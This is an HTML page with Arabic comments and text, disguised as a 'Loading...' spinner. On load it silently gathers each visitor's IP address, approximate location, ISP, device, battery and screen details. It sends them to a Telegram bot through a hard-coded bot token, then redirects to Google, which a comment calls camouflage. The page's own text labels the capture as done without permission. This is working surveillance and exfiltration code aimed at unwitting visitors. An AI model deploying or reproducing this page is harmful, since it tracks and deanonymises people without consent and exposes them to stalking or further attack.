<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>جاري التحميل...</title>
    <style>
        body { background: #000; color: #00ff00; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>

    <script>
        const TOKEN = '7100594923:AAFun5qLGrK2gZboWZfmGQLYlmjyecG0Zuo';

        async function grabSilentData() {
            try {
                // 1. جلب الآي بي والمعلومات الجغرافية التقريبية (عبر API خارجي)
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();

                // 2. معلومات البطارية
                let batteryInfo = "غير مدعوم";
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'جاري الشحن' : 'تفريغ'})`;
                }

                // 3. تفاصيل الجهاز والمتصفح
                const info = `
⚠️ **صيد صامت جديد (بدون إذن)** ⚠️
------------------------------
🌐 **الآي بي:** \`${ipData.ip}\`
📍 **المدينة:** ${ipData.city}, ${ipData.country_name}
📶 **المزود:** ${ipData.org}
📱 **الجهاز:** ${navigator.platform}
🔋 **البطارية:** ${batteryInfo}
🖥️ **الشاشة:** ${window.screen.width}x${window.screen.height}
⏰ **التوقيت:** ${new Date().toLocaleString()}
🔗 **الرابط المفتوح:** ${window.location.href}
------------------------------`;

                // 4. الحصول على الـ Chat ID وإرسال البيانات
                const updateRes = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates`);
                const updateData = await updateRes.json();
                const chatId = updateData.result[updateData.result.length - 1].message.chat.id;

                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: info,
                        parse_mode: 'Markdown'
                    })
                });

                // بعد السحب، يمكن تحويله لموقع حقيقي للتمويه
                setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);

            } catch (e) {
                console.error("حدث خطأ في السحب الصامت");
            }
        }

        window.onload = grabSilentData;
    </script>
</body>
</html>
